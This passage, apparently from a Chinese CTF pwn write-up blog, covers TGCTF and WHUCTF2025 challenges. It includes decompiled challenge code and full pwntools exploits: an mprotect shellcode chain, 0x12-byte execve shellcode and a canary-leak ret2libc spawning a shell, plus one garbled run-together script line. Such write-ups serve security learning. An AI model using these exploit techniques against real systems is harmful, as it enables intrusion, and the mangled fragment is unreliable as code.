gets(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在ida分析时发现这是一道32位静态链接的题目，不考虑ret2libc。<br>题目开启了canary和NX，又是静态题目，我们考虑写入shellcode并执行mprotect函数提升权限<br>看调用gets函数的汇编代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">call    gets</span><br><span class="line">add     esp, 10h</span><br><span class="line">mov     eax, 0</span><br><span class="line">lea     esp, [ebp-8]</span><br><span class="line">pop     ecx</span><br><span class="line">pop     ebx</span><br><span class="line">pop     ebp</span><br><span class="line">lea     esp, [ecx-4]</span><br><span class="line">retn</span><br></pre></td></tr></table></figure><p>xxxxxxxxxx from pwn import*context.os&#x3D;’linux’context.arch&#x3D;’amd64’context.log_level&#x3D;’debug’libc&#x3D;ELF(‘.&#x2F;libc.so.6’)log.success(hex(libc.sym[“system”]-libc.sym[“printf”]))​r&#x3D;remote(‘125.220.147.47’,49761)​payload&#x3D;b”\x01”+p8(0x70)+b”\x05”+p8(0x80)payload+&#x3D;b”\x01\x07\x06\x81\x03”+b”\x05”+p8(0x81)payload+&#x3D;b”\x01\x01\x06\x82\x04”+b”\x05”+p8(0x82)payload+&#x3D;b”\x01s”+ b”\x05”+p8(0x0)+ b”\x01h”+ b”\x05”+p8(0x1)​r.sendlineafter(b”input length: “, str(len(payload)).encode())r.sendafter(b”input code: “, payload)r.interactive()python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r=remote()</span></span><br><span class="line">r=process(<span class="string">&#x27;./tgctf_overflow&#x27;</span>)</span><br><span class="line">mprotect_add=<span class="number">0x8070A70</span></span><br><span class="line">puts_add=<span class="number">0x80527D0</span></span><br><span class="line">name_pro=<span class="number">0x80EF000</span></span><br><span class="line">name=<span class="number">0x80ef320</span></span><br><span class="line">canary=name+<span class="number">4</span></span><br><span class="line"></span><br><span class="line">shellcode=p32(mprotect_add)+p32(name+<span class="number">20</span>)+p32(name_pro)+p32(<span class="number">0x1000</span>)+p32(<span class="number">7</span>)+asm(shellcraft.sh())</span><br><span class="line">payload1=shellcode.rjust(<span class="number">256</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">log.success(<span class="built_in">len</span>(shellcode))</span><br><span class="line">r.sendafter(<span class="string">b&#x27;could you tell me your name?&#x27;</span>,payload1)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xc8</span>+p32(name+<span class="number">4</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;i heard you love gets,right?&#x27;</span>,payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><h3 id="shellcode-1"><a href="#shellcode-1" class="headerlink" title="shellcode"></a>shellcode</h3><p>源码<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;hello hacker&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;try to show your strength &quot;</span>);</span><br><span class="line">  buf = mmap(<span class="number">0LL</span>, <span class="number">0x1000u</span>LL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x12u</span>LL);</span><br><span class="line">  mprotect(buf, <span class="number">0x1000u</span>LL, <span class="number">4</span>);</span><br><span class="line">  sub_11C9((__int64)buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_11c9函数的源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_11C9</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __asm &#123; jmp     rdi &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以输入0x12字节的shellcode，最后直接执行，gdb调试得知执行时我们输入的shellcode时候寄存器全部清零，除了rip指向{jmp rdi}和rdi指向我们输入的shellcode<br>于是我们写短的shellcode即可，但0x12已经比常规最短shellcode还要短了<br>最短shellcode<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">48 31 f6             xor rsi, rsi</span><br><span class="line">56                 push rsi</span><br><span class="line">58 bf 2f 62 69 6e 2f mov rdi,0x68732f2f6e69622f;</span><br><span class="line">2f 73 68</span><br><span class="line">57                   push rdi</span><br><span class="line">54                   push rsp</span><br><span class="line">5f                   pop rdi     ;stack pointer to /bin//sh</span><br><span class="line">b0 3b                mov al, 59 ;sys_execve 66 b8 3b 00 mov ax,59</span><br><span class="line">99                   cdq     ;sign extend of eax</span><br><span class="line">0f 05                syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于只有0x12字节，使用栈来传入&#x2F;bin&#x2F;sh是行不通的。此题便可以使用寄存器的信息。由于有rdi指向我们输入的shellcode，可以利用这一点直接写&#x2F;bin&#x2F;sh，然后add rdi即可实现&#x2F;bin&#x2F;sh的传入<br>最后令eax为execve的系统调用号，再syscall就可getshell<br>exp<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=process(<span class="string">&#x27;./tgctf_shellcode&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote()</span></span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        mov eax,0x3b</span></span><br><span class="line"><span class="string">        add rdi,0x8</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">shellcode+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">b&#x27;strength &#x27;</span>,shellcode)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h2><p>笔者的ida反汇编不出这题的源码（悲，硬着头皮看汇编做不太现实，遂放弃</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> stack </category>
          
          <category> ROP </category>
          
          <category> ret2libc </category>
          
          <category> shellcode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WHUCTF2025</title>
      <link href="/2025/05/02/WHUCTF2025/"/>
      <url>/2025/05/02/WHUCTF2025/</url>
      
        <content type="html"><![CDATA[<h2 id="repeater-handout"><a href="#repeater-handout" class="headerlink" title="repeater_handout"></a>repeater_handout</h2><h3 id="复盘-ret2libc"><a href="#复盘-ret2libc" class="headerlink" title="复盘&#x2F;ret2libc"></a>复盘&#x2F;ret2libc</h3><p>题目源码<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">&quot;When Siesta was chatting with Rin-chan, he was so engrossed that he couldn&#x27;t hear what Mio and Rinpo were saying. He&quot;</span></span><br><span class="line">    <span class="string">&quot; just repeated their words to brush them off&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;choose your option: \n1. input\n2. repeat\n3. exit&quot;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">0x100u</span>LL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">2</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先放exp<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;125.220.147.47&#x27;</span>,<span class="number">49739</span>)</span><br><span class="line"><span class="comment">#r=process(&#x27;./repeater_handout&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./repeater_handout&#x27;</span>)</span><br><span class="line">pop_rdi_offset=<span class="number">0x02a3e5</span></span><br><span class="line">ret_offset=<span class="number">0x029139</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choose your option: \n1. input\n2. repeat\n3. exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload0=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">r.send(payload0)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choose your option: \n1. input\n2. repeat\n3. exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.recv(<span class="number">25</span>)</span><br><span class="line">canary=u64(r.recv()[<span class="number">25</span>:<span class="number">32</span>].rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choose your option: \n1. input\n2. repeat\n3. exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">16</span></span><br><span class="line">r.send(payload1)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choose your option: \n1. input\n2. repeat\n3. exit&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.recv(<span class="number">40</span>)</span><br><span class="line">ret_add=u64(r.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">__libc_start_main_add=ret_add+<span class="number">48</span></span><br><span class="line">libcbase=__libc_start_main_add-libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">pop_rdi_add=libcbase+pop_rdi_offset</span><br><span class="line">ret=libcbase+ret_offset</span><br><span class="line">sys_add=libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_add=libcbase+<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choose your option: \n1. input\n2. repeat\n3. exit&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(canary)+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(pop_rdi_add)+p64(bin_add)+p64(ret)+p64(sys_add)</span><br><span class="line">r.send(payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>基本的栈溢出，有canary保护和NX保护，打ret2libc<br>溢出先覆盖canary的最低字节处的\x00，防止输出被截断，成功泄露canary，下一次溢出就可以绕过canary泄露出栈上的返回地址<br>接下来gdb调试一下得出泄露的返回地址与libc_start_main函数的偏移，就成功泄露libc<br>此处注意在gdb时发现无法直接在main函数处下断点，<strong>现在知道<code>__libc_start_main</code>函数的第一个参数就是main函数地址</strong>，在<code>__libc_start_main</code>处下断点再查看rdi寄存器就可以得到main函数的地址了<br>尤其注意最后加上一个ret片段来完成栈对齐<br>引申：**<code>_start</code>函数调用<code>__libc_start_main</code>函数中的一段，被称为<code>__libc_start_call_main</code>（在调试时可以看到）调用main函数，main函数返回时会返回到<code>__libc_start_main</code>函数的某一偏移处，接着调用exit函数，程序结束**<br></p><h2 id="ezvm"><a href="#ezvm" class="headerlink" title="ezvm"></a>ezvm</h2><h3 id="复现-vm-got表覆写"><a href="#复现-vm-got表覆写" class="headerlink" title="复现&#x2F;vm&#x2F;got表覆写"></a>复现&#x2F;vm&#x2F;got表覆写</h3><p>这是一道虚拟机题目，一般源码很长，但漏洞点一般就一些，其他选项是迷惑<br>题目的虚拟机实现的源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_12AE</span><span class="params">(__int64 a1, __int64 a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+26h] [rbp-2Ah]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+27h] [rbp-29h]</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+29h] [rbp-27h]</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [rsp+2Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> v11; <span class="comment">// [rsp+2Dh] [rbp-23h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v12; <span class="comment">// [rsp+2Eh] [rbp-22h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v13; <span class="comment">// [rsp+2Fh] [rbp-21h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v14; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v15; <span class="comment">// [rsp+31h] [rbp-1Fh]</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// [rsp+32h] [rbp-1Eh]</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [rsp+33h] [rbp-1Dh]</span></span><br><span class="line">  <span class="type">char</span> v18; <span class="comment">// [rsp+34h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> v19; <span class="comment">// [rsp+35h] [rbp-1Bh]</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// [rsp+36h] [rbp-1Ah]</span></span><br><span class="line">  <span class="type">char</span> v21; <span class="comment">// [rsp+37h] [rbp-19h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v22; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v23; <span class="comment">// [rsp+39h] [rbp-17h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v24; <span class="comment">// [rsp+3Ah] [rbp-16h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v25; <span class="comment">// [rsp+3Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+3Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v25 = *(_BYTE *)(i + a2);</span><br><span class="line">    <span class="keyword">switch</span> ( v25 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        sub_11E6(a1, *(<span class="type">unsigned</span> __int8 *)(++i + a2));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        sub_1254(a1);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        v7 = sub_1254(a1);</span><br><span class="line">        v6 = sub_1254(a1);</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v7 + v6));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        v9 = sub_1254(a1);</span><br><span class="line">        v8 = sub_1254(a1);</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v9 - v8));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        v3 = *(<span class="type">char</span> *)(++i + a2);</span><br><span class="line">        *(_BYTE *)(a1 + v3) = sub_1254(a1);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">        sub_11E6(a1, *(<span class="type">unsigned</span> __int8 *)(a1 + *(<span class="type">char</span> *)(++i + a2)));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Stack underflow!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ++*(_BYTE *)(a1 + *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) + <span class="number">128</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) &lt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Stack underflow!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        --*(_BYTE *)(a1 + *(<span class="type">int</span> *)(a1 + <span class="number">256</span>) + <span class="number">128</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9u</span>:</span><br><span class="line">        v11 = sub_1254(a1);</span><br><span class="line">        v10 = sub_1254(a1);</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v10 * v11));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xAu</span>:</span><br><span class="line">        v13 = sub_1254(a1);</span><br><span class="line">        v12 = sub_1254(a1);</span><br><span class="line">        <span class="keyword">if</span> ( !v12 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Division by zero!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v13 / v12));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xBu</span>:</span><br><span class="line">        v15 = sub_1254(a1);</span><br><span class="line">        v14 = sub_1254(a1);</span><br><span class="line">        <span class="keyword">if</span> ( !v14 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Division by zero!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v15 % v14));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xCu</span>:</span><br><span class="line">        v17 = sub_1254(a1);</span><br><span class="line">        v16 = sub_1254(a1);</span><br><span class="line">        sub_11E6(a1, (<span class="type">unsigned</span> __int8)(v16 &amp; v17));</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0xDu</span>:</span><br><span class="line">        v19 = sub_1254(a1);</span><br><span class="line">        v18 = sub_1254(a1);</span><br><span 